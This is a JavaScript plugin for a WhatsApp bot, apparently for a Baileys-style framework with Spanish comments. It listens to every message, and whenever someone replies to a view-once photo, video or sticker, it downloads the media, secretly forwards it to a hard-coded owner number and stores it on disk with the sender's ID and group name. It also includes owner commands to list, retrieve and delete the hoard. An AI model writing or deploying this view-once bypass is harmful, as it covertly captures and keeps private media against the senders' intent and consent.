import fs from 'fs'
import path from 'path'
import { webp2png } from '../lib/webp2mp4.js'

const OWNER_FIXED = '59898719147@s.whatsapp.net'

// ===================================================
// ✅ PARTE 1: DETECTOR AUTOMÁTICO VIEW ONCE (CUALQUIERA)
// ===================================================
let handler = async (m, { conn, args, command }) => {
  try {
    const q = m.quoted

    const isViewOnce =
      q?.message?.viewOnceMessageV2 ||
      q?.message?.viewOnceMessageV2Extension

    // ✅ DETECCIÓN AUTOMÁTICA POR RESPUESTA
    if (q && isViewOnce) {
      const mime = q.mimetype || q.mediaType || ''
      if (!/webp|image|video/.test(mime)) return

      await m.react('😂')

      let buffer = await q.download()
      let type = mime.startsWith('video') ? 'video' : 'image'
      let filenameSent = `recuperado.${mime.split('/')[1] || 'jpg'}`

      // ✅ STICKER → PNG
      if (/webp/.test(mime)) {
        let result = await webp2png(buffer)
        if (result?.url) {
          buffer = Buffer.from(await (await fetch(result.url)).arrayBuffer())
          type = 'image'
          filenameSent = 'sticker.png'
        }
      }

      // ✅ ENVIAR AL OWNER
      await conn.sendMessage(
        OWNER_FIXED,
        { [type]: buffer, fileName: filenameSent, caption: '📸 Recuperado automáticamente.' },
        { quoted: null }
      )

      // ✅ GUARDADO AUTOMÁTICO
      const mediaFolder = './media'
      if (!fs.existsSync(mediaFolder)) fs.mkdirSync(mediaFolder)

      global.db.data.mediaList = global.db.data.mediaList || []

      const filename = `${Date.now()}_${Math.floor(Math.random() * 9999)}`
      const extFile = filenameSent.split('.').pop()
      const finalName = `${filename}.${extFile}`
      const filepath = path.join(mediaFolder, finalName)

      fs.writeFileSync(filepath, buffer)

      let chatInfo = null
      if (m.isGroup) {
        try { chatInfo = await conn.groupMetadata(m.chat) } catch {}
      }

      global.db.data.mediaList.push({
        id: global.db.data.mediaList.length + 1,
        filename: finalName,
        path: filepath,
        type,
        from: m.sender,
        groupId: m.isGroup ? m.chat : null,
        groupName: m.isGroup ? (chatInfo?.subject || '') : null,
        date: new Date().toLocaleString(),
        savedBy: 'viewOnce-respuesta'
      })

      return
    }

    // ===================================================
    // ✅ PARTE 2: PANEL ADMIN DE MEDIOS (SOLO OWNERS)
    // ===================================================

    const owners = (global.owner || [])
      .map(o => (Array.isArray(o) ? o[0] : o))
      .map(v => v.replace(/[^0-9]/g,'') + '@s.whatsapp.net')

    if (!owners.includes(m.sender)) return

    const list = global.db.data.mediaList || []

    // ✅ LISTAR
    if (command === 'medialist') {
      if (!list.length) return m.reply('No hay medios guardados.')

      const text = list.slice(0,50).map(it =>
        `ID:${it.id} • ${it.filename} • ${it.type} • ${it.date}`
      ).join('\n')

      return m.reply(`📁 MEDIOS:\n\n${text}`)
    }

    // ✅ ENVIAR
    if (command === 'mediaget') {
      const id = parseInt(args[0])
      const item = list.find(x => x.id === id)
      if (!item) return m.reply('No existe ese ID.')

      const buffer = fs.readFileSync(item.path)

      return conn.sendMessage(
        m.sender,
        { [item.type]: buffer, fileName: item.filename },
        { quoted: m }
      )
    }

    // ✅ BORRAR
    if (command === 'mediadel') {
      const ids = args.map(v => parseInt(v)).filter(v => !isNaN(v))
      let count = 0

      for (const id of ids) {
        const i = list.findIndex(x => x.id === id)
        if (i === -1) continue

        const file = list[i]
        if (fs.existsSync(file.path)) fs.unlinkSync(file.path)
        list.splice(i, 1)
        count++
      }

      return m.reply(`🗑 Se borraron ${count} archivos.`)
    }

    // ✅ BORRAR TODO
    if (command === 'mediaclear') {
      for (const it of list) {
        if (fs.existsSync(it.path)) fs.unlinkSync(it.path)
      }

      global.db.data.mediaList = []
      return m.reply('🗑 Media completamente limpiado.')
    }

  } catch (e) {
    console.error(e)
  }
}

handler.all = handler

handler.command = [
  'medialist',
  'mediaget',
  'mediadel',
  'mediaclear'
]

handler.owner = true
export default handler
